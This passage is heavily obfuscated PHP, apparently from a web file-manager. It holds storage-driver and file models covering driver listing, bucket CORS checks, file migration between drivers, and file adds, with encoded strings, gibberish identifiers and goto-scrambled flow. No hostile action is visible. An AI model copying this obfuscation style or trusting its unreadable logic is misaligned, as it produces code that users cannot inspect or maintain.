$C§Ì¶ò‘ÉØ = $f²¿ÜÊÏÑ[$EÙ‘±Š‰±[397]] == $EÙ‘±Š‰±[86]; $Aœ¶¯¾„Ñ = $D™ÎÌô‚†å->fileNameAuto($f²¿ÜÊÏÑ[$EÙ‘±Š‰±[472]], $f²¿ÜÊÏÑ[$EÙ‘±Š‰±[28]], REPEAT_RENAME_FOLDER, $C§Ì¶ò‘ÉØ); if ($Aœ¶¯¾„Ñ != $f²¿ÜÊÏÑ[$EÙ‘±Š‰±[28]]) { $D™ÎÌô‚†å->rename($dÅœ­³î§, $Aœ¶¯¾„Ñ); } $D™ÎÌô‚†å->where($AµŞÓ¼¶À)->setField($EÙ‘±Š‰±[417], 0); $dóÕÆ®ôˆ->eventRecycle($dÅœ­³î§, $EÙ‘±Š‰±[1967]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\x73\x74\x6f\162\x61\147\145\x4c\x69\x73\164"; public $field = array("\156\141\x6d\x65", "\x73\x69\172\145\x4d\141\x78", "\x73\x79\x73\164\145\155", "\x64\x65\146\x61\x75\x6c\x74", "\144\162\x69\x76\145\x72", "\143\x6f\x6e\x66\x69\x67"); public function listData($C÷Ñ‰ÆÇ¹­ = false, $D¢¤†¤„¸¨ = "\155\157\144\151\x66\171\124\151\155\145", $A÷‰Î×”Œ = false) { $eÄÉ²½ÅÁ° =& $_SERVER[¹Ò‹Ò¹]; $f Ê‘ïÆ’œ = parent::listData($C÷Ñ‰ÆÇ¹­, $D¢¤†¤„¸¨, $A÷‰Î×”Œ); if ($C÷Ñ‰ÆÇ¹­) { return $f Ê‘ïÆ’œ; } $BÖ»ä…ŒÍ = $this->ioSizeUseGet(array_to_keyvalue($f Ê‘ïÆ’œ, $eÄÉ²½ÅÁ°[33], $eÄÉ²½ÅÁ°[388])); foreach ($f Ê‘ïÆ’œ as $Eïó£•¬„´ => $fÆª²ÙŸÙ°) { unset($f Ê‘ïÆ’œ[$Eïó£•¬„´][$eÄÉ²½ÅÁ°[6]]); $f Ê‘ïÆ’œ[$Eïó£•¬„´][$eÄÉ²½ÅÁ°[1653]] = isset($BÖ»ä…ŒÍ[$fÆª²ÙŸÙ°[$eÄÉ²½ÅÁ°[388]]]) ? $BÖ»ä…ŒÍ[$fÆª²ÙŸÙ°[$eÄÉ²½ÅÁ°[388]]] : 0; } return $f Ê‘ïÆ’œ; } public function ioSizeUseGet($Eó³ù¡Ë·–) { goto bó†ğéµöÁ; bó†ğéµöÁ: $eóŸÈ’‡£œ =& $_SERVER[¹Ò‹Ò¹]; if (!$Eó³ù¡Ë·–) { return array(); } $aé°¼¤©’¡ = $eóŸÈ’‡£œ[1968] . implode($eóŸÈ’‡£œ[47], $Eó³ù¡Ë·–); goto céä¼¯Å–; EØ¹ã•Ì×: $cò—»éĞ¥í = array($eóŸÈ’‡£œ[762] => array($eóŸÈ’‡£œ[7], $Eó³ù¡Ë·–)); $Cõßºªîø = Model($eóŸÈ’‡£œ[733])->field($F‚¨Ö‚¦Œ´)->where($cò—»éĞ¥í)->group($eóŸÈ’‡£œ[762])->select(); $Cõßºªîø = array_to_keyvalue($Cõßºªîø, $eóŸÈ’‡£œ[388], $eóŸÈ’‡£œ[77]); goto A‡éí”Ø˜»; A‡éí”Ø˜»: Cache::set($aé°¼¤©’¡, $Cõßºªîø, 60); return $Cõßºªîø; goto fÉ¨Êè’àë; céä¼¯Å–: $Cõßºªîø = Cache::get($aé°¼¤©’¡); if ($Cõßºªîø) { return $Cõßºªîø; } $F‚¨Ö‚¦Œ´ = array($eóŸÈ’‡£œ[762] => $eóŸÈ’‡£œ[388], $eóŸÈ’‡£œ[1969] => $eóŸÈ’‡£œ[77]); goto EØ¹ã•Ì×; fÉ¨Êè’àë: } public function getConfig($a˜×©Á›Ø) { $cØ˜ÂğÊ§† = parent::listData($a˜×©Á›Ø); return json_decode($cØ˜ÂğÊ§†[$_SERVER[¹Ò‹Ò¹][6]], !0); } public function update($bÎóñæ†×, $f‘ß…í•Ã“) { goto E‚ˆå êÜ; E‚ˆå êÜ: $DÆÒ¶½Ö¶Š =& $_SERVER[¹Ò‹Ò¹]; $A“³†ÎÛİÀ = $f‘ß…í•Ã“[$DÆÒ¶½Ö¶Š[28]]; $eİÃ÷±©‹· = array_to_keyvalue(parent::listData(), $DÆÒ¶½Ö¶Š[28]); goto F¥íØ„‰¨İ; aö·ñÎ×á¸: $F¢›š¤Ã…© = parent::update($bÎóñæ†×, $f‘ß…í•Ã“); if ($F¢›š¤Ã…© && $f‘ß…í•Ã“[$DÆÒ¶½Ö¶Š[34]]) { foreach ($eİÃ÷±©‹· as $eº‘¾Ñï) { if ($eº‘¾Ñï[$DÆÒ¶½Ö¶Š[34]] && $eº‘¾Ñï[$DÆÒ¶½Ö¶Š[388]] != $bÎóñæ†×) { parent::update($eº‘¾Ñï[$DÆÒ¶½Ö¶Š[388]], array($DÆÒ¶½Ö¶Š[34] => 0)); } } } return $F¢›š¤Ã…©; goto c°ê¢¼«Ğ«; F¥íØ„‰¨İ: if (isset($eİÃ÷±©‹·[$A“³†ÎÛİÀ]) && $eİÃ÷±©‹·[$A“³†ÎÛİÀ][$DÆÒ¶½Ö¶Š[388]] != $bÎóñæ†×) { return !1; } if (isset($f‘ß…í•Ã“[$DÆÒ¶½Ö¶Š[1970]]) && $f‘ß…í•Ã“[$DÆÒ¶½Ö¶Š[1970]] == $DÆÒ¶½Ö¶Š[86]) { $this->checkConfig($f‘ß…í•Ã“); } unset($f‘ß…í•Ã“[$DÆÒ¶½Ö¶Š[1970]]); goto aö·ñÎ×á¸; c°ê¢¼«Ğ«: } public function add($b¬íç˜»­) { goto DœËĞÈ†¸; añà©°ƒÛ›: $this->checkConfig($b¬íç˜»­); $EÜÖé‘“»ñ = parent::insert($b¬íç˜»­); if ($EÜÖé‘“»ñ && $b¬íç˜»­[$aÀÆŠø¾‡[34]]) { foreach ($DÆ®Ïš°¥× as $e˜ëî—öã˜) { if ($e˜ëî—öã˜[$aÀÆŠø¾‡[34]]) { parent::update($e˜ëî—öã˜[$aÀÆŠø¾‡[388]], array($aÀÆŠø¾‡[34] => 0)); } } } goto e’éœóŒ—ğ; e’éœóŒ—ğ: return $EÜÖé‘“»ñ; goto Dàƒòç™ÃÜ; DœËĞÈ†¸: $aÀÆŠø¾‡ =& $_SERVER[¹Ò‹Ò¹]; $DÆ®Ïš°¥× = array_to_keyvalue(parent::listData(), $aÀÆŠø¾‡[28]); if (isset($DÆ®Ïš°¥×[$b¬íç˜»­[$aÀÆŠø¾‡[28]]])) { return !1; } goto añà©°ƒÛ›; Dàƒòç™ÃÜ: } public function checkConfig(&$EºŠÙœâ•) { goto c™ÄŸ‹Ï÷ã; c™ÄŸ‹Ï÷ã: $CòÆå‚õ =& $_SERVER[¹Ò‹Ò¹]; $c¦¨ÇÓ“ÇØ = strtolower($EºŠÙœâ•[$CòÆå‚õ[93]]); $D‰æÛùØßé = json_decode($EºŠÙœâ•[$CòÆå‚õ[6]], !0); goto EÖóĞ®ê›…; F“ë¡¾ã™”: $EºŠÙœâ•[$CòÆå‚õ[6]] = json_encode($D‰æÛùØßé); $EºŠÙœâ•[$CòÆå‚õ[93]] = $bÃÛÖ¿ĞŠÄ; return !0; goto eãÆ¾µœÎ¥; A‘ğ‘°Î¤: $bÑ ëÒØÃÆ = new $a¼‹—ˆ†Ï‹($D‰æÛùØßé); if (in_array($c¦¨ÇÓ“ÇØ, $bÑ ëÒØÃÆ->objectDriver)) { if (!$bÑ ëÒØÃÆ->isBucketCors() && !$bÑ ëÒØÃÆ->setBucketCors()) { $b°Âó «‘ƒ = LNG($CòÆå‚õ[1975]); $b°Âó «‘ƒ .= $CòÆå‚õ[1976] . LNG($CòÆå‚õ[1977]); show_json($b°Âó «‘ƒ, !1); } } $A¨µ‚”¿© = rtrim($D‰æÛùØßé[$CòÆå‚õ[1051]], $CòÆå‚õ[8]) . $CòÆå‚õ[8]; goto A“òÔ—ÑÈ; EÖóĞ®ê›…: foreach ($D‰æÛùØßé as $Fá•Â´ÎÅó => $DŒŞáÇŒ‹) { $D‰æÛùØßé[$Fá•Â´ÎÅó] = trim($DŒŞáÇŒ‹); } $D‰æÛùØßé[$CòÆå‚õ[1971]] = rand_string(6); $AÏèøŠÌ¡á = $GLOBALS[$CòÆå‚õ[6]][$CòÆå‚õ[87]][$CòÆå‚õ[770]]; goto C½…¤Ù—ö; A“òÔ—ÑÈ: $DÏ¼‹ŠãÓ = $bÑ ëÒØÃÆ->getPath($A¨µ‚”¿© . $CòÆå‚õ[1112]); if (!$bÑ ëÒØÃÆ->mkfile($DÏ¼‹ŠãÓ)) { show_json(LNG($CòÆå‚õ[1975]), !1); } $D‰æÛùØßé[$CòÆå‚õ[1051]] = $A¨µ‚”¿©; goto F“ë¡¾ã™”; C½…¤Ù—ö: $bÃÛÖ¿ĞŠÄ = isset($AÏèøŠÌ¡á[$c¦¨ÇÓ“ÇØ]) ? $AÏèøŠÌ¡á[$c¦¨ÇÓ“ÇØ] : ucfirst($c¦¨ÇÓ“ÇØ); $a¼‹—ˆ†Ï‹ = $CòÆå‚õ[71] . $bÃÛÖ¿ĞŠÄ; if (!$bÃÛÖ¿ĞŠÄ || !class_exists($a¼‹—ˆ†Ï‹)) { write_log(array($CòÆå‚õ[1972], $EºŠÙœâ•, get_caller_info()), $CòÆå‚õ[1973]); show_json(LNG($CòÆå‚õ[1974]), !1, $EºŠÙœâ•); } goto A‘ğ‘°Î¤; eãÆ¾µœÎ¥: } public function driverListSystem() { $B—¼Ô”ÙŞÄ =& $_SERVER[¹Ò‹Ò¹]; $B–©¶Å©–Â = parent::listData(); $AÑ²‹æÙ‰ò = array(); foreach ($B–©¶Å©–Â as $CÙÄŠ„â•ä) { unset($CÙÄŠ„â•ä[$B—¼Ô”ÙŞÄ[192]], $CÙÄŠ„â•ä[$B—¼Ô”ÙŞÄ[83]]); $CÙÄŠ„â•ä[$B—¼Ô”ÙŞÄ[6]] = json_decode($CÙÄŠ„â•ä[$B—¼Ô”ÙŞÄ[6]], !0); $AÑ²‹æÙ‰ò[] = $CÙÄŠ„â•ä; } return $AÑ²‹æÙ‰ò; } public function defaultDriver() { $aŠ¿ÓÁÙ‡Û =& $_SERVER[¹Ò‹Ò¹]; $eì…¯à‹ô÷ = parent::listData(); $F·¶äí† = array_filter_by_field($eì…¯à‹ô÷, $aŠ¿ÓÁÙ‡Û[34], 1); $F·¶äí† = $F·¶äí†[0]; if ($F·¶äí†) { $F·¶äí†[$aŠ¿ÓÁÙ‡Û[6]] = json_decode($F·¶äí†[$aŠ¿ÓÁÙ‡Û[6]], !0); } return $F·¶äí†; } public function driverInfo($BÅöê²ã¾‹) { $EÒ…‡ÏŞ¨ =& $_SERVER[¹Ò‹Ò¹]; $AŸîñ”Î¤ù = array_to_keyvalue(parent::listData(), $EÒ…‡ÏŞ¨[388]); if (!isset($AŸîñ”Î¤ù[$BÅöê²ã¾‹])) { return !1; } $D¤¯‰ˆÖƒ¨ = $AŸîñ”Î¤ù[$BÅöê²ã¾‹]; $D¤¯‰ˆÖƒ¨[$EÒ…‡ÏŞ¨[6]] = json_decode($D¤¯‰ˆÖƒ¨[$EÒ…‡ÏŞ¨[6]], !0); return $D¤¯‰ˆÖƒ¨; } public function remove($CĞµâØœÃ…) { $this->removeShareItems($CĞµâØœÃ…); return parent::remove($CĞµâØœÃ…); } public function removeWithFile($b£§ÉÃŸ¥Ï, $E¸ÂŠ‡Ò©) { goto fèéÍ·í•Ç; dä«¹“¼¾Ï: if (!$EË˜İÙÊÎã) { $fÁÁÄÛºâÉ->stop($c»ÃÓÉÎš ); return !1; } $fÁÁÄÛºâÉ->end(); if ($E¸ÂŠ‡Ò© == $bòÒ†ôÓâ[1633]) { $this->remove($b£§ÉÃŸ¥Ï); } goto A­ó“Õø¤; fÅ·Èš­á: $fÁÁÄÛºâÉ->task[$bòÒ†ôÓâ[713]] = (double) $C×çÆ™¶ğÃ; $f¥Õà²Îøø = KodIO::defaultDriver(); $fìŒèó¥Ï = $f¥Õà²Îøø[$bòÒ†ôÓâ[388]]; goto bĞÅ»‚¼Õ; bĞÅ»‚¼Õ: $cÍé’ƒî…© = "\173\151\157\x3a{$fìŒèó¥Ï}\x7d\57"; $EË˜İÙÊÎã = !0; $Eš†´èß«‹ = array(); goto aƒ°–½ é£; fèéÍ·í•Ç: $bòÒ†ôÓâ =& $_SERVER[¹Ò‹Ò¹]; $cÙ¸ºÛ¼î = array($bòÒ†ôÓâ[762] => $b£§ÉÃŸ¥Ï); $Cğ«ÙÀóŒ¶ = Model($bòÒ†ôÓâ[444])->where($cÙ¸ºÛ¼î)->count(); goto fÎòàæğáí; fÎòàæğáí: $C×çÆ™¶ğÃ = Model($bòÒ†ôÓâ[444])->where($cÙ¸ºÛ¼î)->sum($bòÒ†ôÓâ[77]); $c»ÃÓÉÎš  = $E¸ÂŠ‡Ò© . $bòÒ†ôÓâ[1978] . $b£§ÉÃŸ¥Ï; $fÁÁÄÛºâÉ = new TaskFileTransfer($c»ÃÓÉÎš , $bòÒ†ôÓâ[1973], $Cğ«ÙÀóŒ¶, LNG($bòÒ†ôÓâ[1979]) . "\50{$b£§ÉÃŸ¥Ï}\x29"); goto fÅ·Èš­á; aƒ°–½ é£: $cä‚òËéƒ = Model($bòÒ†ôÓâ[191])->where($cÙ¸ºÛ¼î)->field($bòÒ†ôÓâ[1980])->select(); foreach ($cä‚òËéƒ as $e›Òù¤ƒ÷) { goto e¢Ä¬…„›; Bò±ÂØŞğ—: $a‚‰Â²šå = array($bòÒ†ôÓâ[762] => $fìŒèó¥Ï, $bòÒ†ôÓâ[75] => $e­†è¼Ôø”); Model($bòÒ†ôÓâ[191])->where($cÙ¸ºÛ¼î)->save($a‚‰Â²šå); goto dùÀ»ÕÑÎ´; e¢Ä¬…„›: $a˜˜ŠÃî„á = $e›Òù¤ƒ÷[$bòÒ†ôÓâ[75]]; $e­†è¼Ôø” = $cÍé’ƒî…© . str_replace("\x7b\151\157\x3a{$b£§ÉÃŸ¥Ï}\x7d\57", $bòÒ†ôÓâ[33], $a˜˜ŠÃî„á); if (!IO::exist($a˜˜ŠÃî„á)) { $Eš†´èß«‹[] = $e›Òù¤ƒ÷[$bòÒ†ôÓâ[441]]; $fÁÁÄÛºâÉ->updateFileEnd($e›Òù¤ƒ÷[$bòÒ†ôÓâ[28]], $e›Òù¤ƒ÷[$bòÒ†ôÓâ[77]]); continue; } goto báº¶ÒŠÁ; báº¶ÒŠÁ: if (IO::exist($e­†è¼Ôø”)) { $fÁÁÄÛºâÉ->updateFileEnd($e›Òù¤ƒ÷[$bòÒ†ôÓâ[28]], $e›Òù¤ƒ÷[$bòÒ†ôÓâ[77]]); continue; } if (!IO::move($a˜˜ŠÃî„á, get_path_father($e­†è¼Ôø”))) { $EË˜İÙÊÎã = !1; break; } $cÙ¸ºÛ¼î = array($bòÒ†ôÓâ[441] => $e›Òù¤ƒ÷[$bòÒ†ôÓâ[441]]); goto Bò±ÂØŞğ—; dùÀ»ÕÑÎ´: } $this->removeByFileID($Eš†´èß«‹); goto dä«¹“¼¾Ï; A­ó“Õø¤: } public function progress($D‡¨Æ¼ëÈá, $EïÉ¬Ÿ¦›) { return Task::get($EïÉ¬Ÿ¦› . $_SERVER[¹Ò‹Ò¹][1978] . $D‡¨Æ¼ëÈá); } private function removeByFileID($b¬ŒÊÒ¢Á« = array()) { goto BÏ ÏÌØà°; F«³ÂŞùŒ•: $bˆ³é½¢È’ = Model($dÄË‹ÇŠî÷[1179])->where($FÎ”ˆƒ†½İ)->field($dÄË‹ÇŠî÷[390])->select(); if (!$bˆ³é½¢È’) { return; } $bˆ³é½¢È’ = array_to_keyvalue($bˆ³é½¢È’, $dÄË‹ÇŠî÷[33], $dÄË‹ÇŠî÷[390]); goto a›Àéöª–; BÏ ÏÌØà°: $dÄË‹ÇŠî÷ =& $_SERVER[¹Ò‹Ò¹]; if (empty($b¬ŒÊÒ¢Á«)) { return; } $FÎ”ˆƒ†½İ = array($dÄË‹ÇŠî÷[441] => array($dÄË‹ÇŠî÷[7], $b¬ŒÊÒ¢Á«)); goto F«³ÂŞùŒ•; a›Àéöª–: foreach ($bˆ³é½¢È’ as $aÑòŸ¦÷„) { Model($dÄË‹ÇŠî÷[403])->removeNow($aÑòŸ¦÷„, !1); } goto A¶Ÿ±¿½; A¶Ÿ±¿½: } private function removeShareItems($E×°ÛªÅä) { goto E“Şá†ªÚ‘; dƒåçÜºÇË: Model($DÉ²ŠšŠé[558])->remove($BÑ¬ÙŒÚ ); goto BŸäƒñ«Ø´; dƒ‰åñ°ğ¾: $aµ§İ®Òó´ = Model($DÉ²ŠšŠé[1644])->where($Aœ ğô©´Õ)->field($DÉ²ŠšŠé[462])->select(); if (empty($aµ§İ®Òó´)) { return; } $BÑ¬ÙŒÚ  = array_to_keyvalue($aµ§İ®Òó´, $DÉ²ŠšŠé[33], $DÉ²ŠšŠé[462]); goto dƒåçÜºÇË; E“Şá†ªÚ‘: $DÉ²ŠšŠé =& $_SERVER[¹Ò‹Ò¹]; $Cèšô‹‡ò = "\x7b\151\157\72{$E×°ÛªÅä}\175\x2f"; $Aœ ğô©´Õ = array($DÉ²ŠšŠé[390] => 0, $DÉ²ŠšŠé[1046] => array($DÉ²ŠšŠé[378], "{$Cèšô‹‡ò}\45")); goto dƒ‰åñ°ğ¾; BŸäƒñ«Ø´: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\114\x69\147\x68\164\101\x70\160"; public $modelType = "\x53\x79\x73\164\x65\x6d\117\x70\x74\151\x6f\156"; public $field = array("\x6e\x61\155\145", "\147\x72\157\165\x70", "\x64\145\163\x63", "\143\157\x6e\x74\x65\156\164"); public function listData($fï£¼ßùÄÃ = false, $E§øù™ç„ = "\x6d\x6f\144\x69\x66\x79\124\151\155\x65", $dö×Åî®öË = true) { return parent::listData($fï£¼ßùÄÃ, $E§øù™ç„, $dö×Åî®öË); } public function remove($D˜ê÷¶™Ÿ) { $A£Ïßä¦ˆ = $this->findByName($D˜ê÷¶™Ÿ); if (!$A£Ïßä¦ˆ) { return !1; } return parent::remove($A£Ïßä¦ˆ[$_SERVER[¹Ò‹Ò¹][388]]); } public function add($BÍ¸‘‚¢å) { if ($this->findByName($BÍ¸‘‚¢å[$_SERVER[¹Ò‹Ò¹][28]])) { return !1; } return parent::insert($BÍ¸‘‚¢å); } public function update($A¿Çª¹ìÅ, $Bô‹½•££) { $E¿ˆ¾›ÚÑã =& $_SERVER[¹Ò‹Ò¹]; $c„Ëàå°ç± = $this->findByName($A¿Çª¹ìÅ); $D’âä—¾ = $this->findByName($Bô‹½•££[$E¿ˆ¾›ÚÑã[28]]); if (!$c„Ëàå°ç± || $D’âä—¾ && $D’âä—¾[$E¿ˆ¾›ÚÑã[388]] != $c„Ëàå°ç±[$E¿ˆ¾›ÚÑã[388]]) { return !1; } return parent::update($c„Ëàå°ç±[$E¿ˆ¾›ÚÑã[388]], $Bô‹½•££); } } goto c³Ü‰êÖĞÙ; b”Á»«Š—: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\154\x65\x5f\x63\157\x6e\164\145\x6e\x74\163"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\151\155\x65", "\x74\x69\x6d\145", "\x69\x6e\163\145\x72\x74", "\146\x75\156\143\x74\x69\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\154\x65"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\x6d\145" => "\x69\x6f\137\x66\151\154\145\x5f\155\145\164\x61", "\x6d\x65\164\x61\x46\x69\145\154\144" => "\x66\151\x6c\x65\x49\x44"); public function fileInfo($d¬¼­ß·ƒ) { $D½¦¸ÕµÑ† =& $_SERVER[¹Ò‹Ò¹]; static $D’§‹åóÆ„ = array(); if (!isset($D’§‹åóÆ„[$d¬¼­ß·ƒ])) { $AÒ—‡¡òÍŒ = $D½¦¸ÕµÑ†[1711]; $e„¼…òËË = Model($D½¦¸ÕµÑ†[444])->field($AÒ—‡¡òÍŒ)->where(array($D½¦¸ÕµÑ†[442] => $d¬¼­ß·ƒ))->find(); $D’§‹åóÆ„[$d¬¼­ß·ƒ] = $e„¼…òËË; } return $D’§‹åóÆ„[$d¬¼­ß·ƒ]; } public function addFileByContent($Bì±¹³õŒò = '', $dù—ˆÍ¥²š = '') { goto c¥­ØÈñ›ñ; fùŒÂ¦‰Œ: if (file_exists($DÓ¸ÎÍŒÂ¶)) { @unlink($DÓ¸ÎÍŒÂ¶); } return $câ¡éàÍ¯©; goto Eè˜ğî³; c¥­ØÈñ›ñ: $a¿”•‰è„¿ =& $_SERVER[¹Ò‹Ò¹]; $F™…ã‹–¿‚ = TEMP_PATH . $a¿”•‰è„¿[1712]; if (!is_dir($F™…ã‹–¿‚)) { mk_dir($F™…ã‹–¿‚); } goto AªÚôØ“©²; AªÚôØ“©²: $DÓ¸ÎÍŒÂ¶ = $F™…ã‹–¿‚ . $a¿”•‰è„¿[1713] . rand_string(16); file_put_contents($DÓ¸ÎÍŒÂ¶, $Bì±¹³õŒò); $câ¡éàÍ¯© = $this->addFile($DÓ¸ÎÍŒÂ¶, $dù—ˆÍ¥²š, !0); goto fùŒÂ¦‰Œ; Eè˜ğî³: } public function createFileName($F³òö´†‘—, $E¡êãÅ«¸‰ = false, $E­¿ñä…™ = false) { goto E¥¹¥°Ğ¢µ; d¸ïÒÅåÚ—: if (!$EŒÏ¢¥àÀŒ && !Cache::get($fç¸º¼Ç­ƒ)) { $EŒÏ¢¥àÀŒ = !0; $b²¦É»ô­ = IO::mkdir($Cï­öŠÔªî); if (!IO::exist($b²¦É»ô­ . $A»‰âäåõ›[1715])) { IO::mkfile($b²¦É»ô­ . $A»‰âäåõ›[1715]); } Cache::set($fç¸º¼Ç­ƒ, 1, 3600 * 2); } return $FŒ……âÅø—; goto bÜ­Ãøˆ¤; fˆëó«Ö: $Cï­öŠÔªî = $BÔ“í„ƒí„->pathFather($FŒ……âÅø—); static $EŒÏ¢¥àÀŒ = false; $fç¸º¼Ç­ƒ = $A»‰âäåõ›[1714] . md5($Cï­öŠÔªî); goto d¸ïÒÅåÚ—; E¥¹¥°Ğ¢µ: $A»‰âäåõ› =& $_SERVER[¹Ò‹Ò¹]; $BÔ“í„ƒí„ = IO::init($A»‰âäåõ›[8]); $FŒ……âÅø— = $this->makeFilePath($F³òö´†‘—, $BÔ“í„ƒí„, $E¡êãÅ«¸‰, $E­¿ñä…™); goto fˆëó«Ö; bÜ­Ãøˆ¤: } public function makeFilePath($fÃ‚Î–ŒÄ•, $bÆİŸÂÍ¡ò, $C“‰öí±²Ü = false, $aùäŞ‘‰ŒÄ = false) { goto f£æ—ËŸÌœ; Dª¶Ô¶¸šÁ: if (!$fÃ‚Î–ŒÄ•) { $F›ø…”¦³ = $cË™íîå¤â[1718]; } switch ($F›ø…”¦³) { case $cË™íîå¤â[1719]: $d­±Ò§’„î = $d­±Ò§’„î . $cË™íîå¤â[94] . $bÆİŸÂÍ¡ò->ext($fÃ‚Î–ŒÄ•); if ($bÄ÷ìÍ‡©  == $cË™íîå¤â[1657]) { $d­±Ò§’„î .= $cË™íîå¤â[1406]; } break; case $cË™íîå¤â[1720]: goto b¿‡™¬ÀÅÍ; E—³ËÍÚ‡: CacheLock::lock($fÙ¯ÄŒ©ø›); $d­±Ò§’„î = $eÏòŠæ‘Áë . $fÃ‚Î–ŒÄ•; if (IO::exist($eÏòŠæ‘Áë . $fÃ‚Î–ŒÄ•)) { $aËÜ¶§é«À = substr($fÃ‚Î–ŒÄ•, 0, strlen($fÃ‚Î–ŒÄ•) - strlen($bÄ÷ìÍ‡© )); $DŸ“Ù¥ = $aùäŞ‘‰ŒÄ ? substr($aùäŞ‘‰ŒÄ, 0, 5) : ($C“‰öí±²Ü ? substr($C“‰öí±²Ü, 0, 5) : rand_string(5)); $d­±Ò§’„î = $eÏòŠæ‘Áë . $aËÜ¶§é«À . $DŸ“Ù¥ . $cË™íîå¤â[94] . $bÄ÷ìÍ‡© ; } goto C‹ùõ’ôãô; f¯Ô”¢…î×: $eÏòŠæ‘Áë = $cË™íîå¤â[1097] . $DË†°ë”Õâ[$cË™íîå¤â[388]] . $cË™íîå¤â[396] . date($cË™íîå¤â[1722]) . $fñøøã³ø . $cË™íîå¤â[8]; if ($bÄ÷ìÍ‡©  == $cË™íîå¤â[1657]) { $fÃ‚Î–ŒÄ• .= $cË™íîå¤â[1406]; } $fÙ¯ÄŒ©ø› = $cË™íîå¤â[1723] . $eÏòŠæ‘Áë . $fÃ‚Î–ŒÄ•; goto E—³ËÍÚ‡; b¿‡™¬ÀÅÍ: $eàùõÍòù = Model($cË™íîå¤â[1099])->get($cË™íîå¤â[1402]); $fñøøã³ø = substr(md5($cË™íîå¤â[1721] . $eàùõÍòù . date($cË™íîå¤â[702])), 0, 8); $DË†°ë”Õâ = KodIO::defaultDriver(); goto f¯Ô”¢…î×; C‹ùõ’ôãô: if (IO::isTypeObject($d­±Ò§’„î) && !IO::isUploadServer($d­±Ò§’„î)) { $bô²óÇ¨µ¥ = IO::setContent($d­±Ò§’„î, $cË™íîå¤â[33]); if (!$bô²óÇ¨µ¥) { show_json($cË™íîå¤â[1724], !1); } } CacheLock::unlock($fÙ¯ÄŒ©ø›); break; goto aï¥„†œÀç; aï¥„†œÀç: case $cË™íîå¤â[1718]: break; default: break; } return $d­±Ò§’„î; goto DÉ®Ç†ó; B‚½¹ÏÃéµ: $d­±Ò§’„î = $eÏòŠæ‘Áë . rand_string(5) . short_id(100); $fÃ‚Î–ŒÄ• = str_replace($cË™íîå¤â[8], $cË™íîå¤â[70], KodIO::clear($fÃ‚Î–ŒÄ•)); $bÄ÷ìÍ‡©  = $bÆİŸÂÍ¡ò->ext($fÃ‚Î–ŒÄ•); goto Dª¶Ô¶¸šÁ; f£æ—ËŸÌœ: $cË™íîå¤â =& $_SERVER[¹Ò‹Ò¹]; $F›ø…”¦³ = Model($cË™íîå¤â[1099])->get($cË™íîå¤â[1716]); $eÏòŠæ‘Áë = KodIO::defaultIO() . date($cË™íîå¤â[1717]); goto B‚½¹ÏÃéµ; DÉ®Ç†ó: } public function addFileByRemote($bÍ°àÉ™íõ, $FëÍ…‹¾, $aïßØ÷Ş– = array()) { goto A×¹©ô‘Š; fâöƒÎØŒ®: $c´Ëá¦½‹Ì = IO::hashMd5($bÍ°àÉ™íõ, $E‹à«¹ˆ¨·); $E‘®Æ¤ÉÀ = KodIO::defaultDriver(); $a„ò¢¶œã¬ = array($e‡™¤æŒçÏ[543] => IO::size($bÍ°àÉ™íõ), $e‡™¤æŒçÏ[1725] => 1, $e‡™¤æŒçÏ[407] => $FëÍ…‹¾, $e‡™¤æŒçÏ[754] => $E‘®Æ¤ÉÀ[$e‡™¤æŒçÏ[388]], $e‡™¤æŒçÏ[408] => $bÍ°àÉ™íõ, $e‡™¤æŒçÏ[1726] => $aïßØ÷Ş–[$e‡™¤æŒçÏ[170]] ? $aïßØ÷Ş–[$e‡™¤æŒçÏ[170]] : IO::hashSimple($bÍ°àÉ™íõ), $e‡™¤æŒçÏ[1727] => $c´Ëá¦½‹Ì ? $c´Ëá¦½‹Ì : $E‹à«¹ˆ¨·); goto D±‰ó“¦±ˆ; A×¹©ô‘Š: $e‡™¤æŒçÏ =& $_SERVER[¹Ò‹Ò¹]; if (!IO::exist($bÍ°àÉ™íõ)) { return !1; } $E‹à«¹ˆ¨· = $aïßØ÷Ş–[$e‡™¤æŒçÏ[169]] ? $aïßØ÷Ş–[$e‡™¤æŒçÏ[169]] : $e‡™¤æŒçÏ[33]; goto fâöƒÎØŒ®; D±‰ó“¦±ˆ: if ($aá—¨¦¢à = $this->addFileCheckExist($a„ò¢¶œã¬[$e‡™¤æŒçÏ[170]], $a„ò¢¶œã¬[$e‡™¤æŒçÏ[169]], $a„ò¢¶œã¬[$e‡™¤æŒçÏ[77]])) { return $aá—¨¦¢à; } return $this->addFileData($a„ò¢¶œã¬); goto dõ‹ó­ªˆ; dõ‹ó­ªˆ: } private function addFileData($e‡ §äƒì×) { $BŠ½£‰‰¨ =& $_SERVER[¹Ò‹Ò¹]; if (!$e‡ §äƒì×) { return !1; } $e‡ §äƒì×[$BŠ½£‰‰¨[77]] = intval($e‡ §äƒì×[$BŠ½£‰‰¨[77]]); if (!$e‡ §äƒì×[$BŠ½£‰‰¨[77]] && strlen($e‡ §äƒì×[$BŠ½£‰‰¨[170]]) > 32) { $e‡ §äƒì×[$BŠ½£‰‰¨[77]] = intval(substr($e‡ §äƒì×[$BŠ½£‰‰¨[170]], 32)); } $D¶õÇÒ¦Ñ¤ = $this->add($e‡ §äƒì×); return $this->find($D¶õÇÒ¦Ñ¤); } public function addFile($bÈÏ±±Öâš, $a‘Ôâ¯ğØ‰, $eô­æœµ™Õ = false) { goto Aí©´Œšğª; cË¦ñÄÏö¦: $Bê°Ê…¾¼ = $_SERVER[¹Ò‹Ò¹][1728] . $f²£®ÎÅäê; CacheLock::lock($Bê°Ê…¾¼); if ($CÙêÂÙâÚ = $this->addFileCheckExist($f…»—·ˆˆº, $f²£®ÎÅäê, $B…ÀĞœÑ§ç)) { CacheLock::unlock($Bê°Ê…¾¼); return $CÙêÂÙâÚ; } goto Aš¥¸áåãÁ; Aš¥¸áåãÁ: $dóáºÌĞš– = $this->addFileMake($bÈÏ±±Öâš, $B…ÀĞœÑ§ç, $f…»—·ˆˆº, $f²£®ÎÅäê, $a‘Ôâ¯ğØ‰, $eô­æœµ™Õ); $a‚”ÔÁæáƒ = 